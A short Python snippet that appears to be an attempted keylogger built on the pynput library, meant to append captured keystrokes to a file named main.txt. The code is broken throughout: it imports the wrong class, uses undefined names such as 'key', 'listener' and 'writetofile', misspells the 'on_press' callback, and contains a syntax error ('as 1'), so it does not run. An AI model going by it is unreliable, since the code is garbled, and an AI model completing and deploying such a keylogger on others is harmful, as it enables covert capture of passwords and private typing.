from pynput.keyboard import Controller


def control(kay):
    keydata = str(key)
    with open('main.txt','a' ) as f:
        f.write(keydata)
with listener(on_preaa=writetofile) as 1:
    join()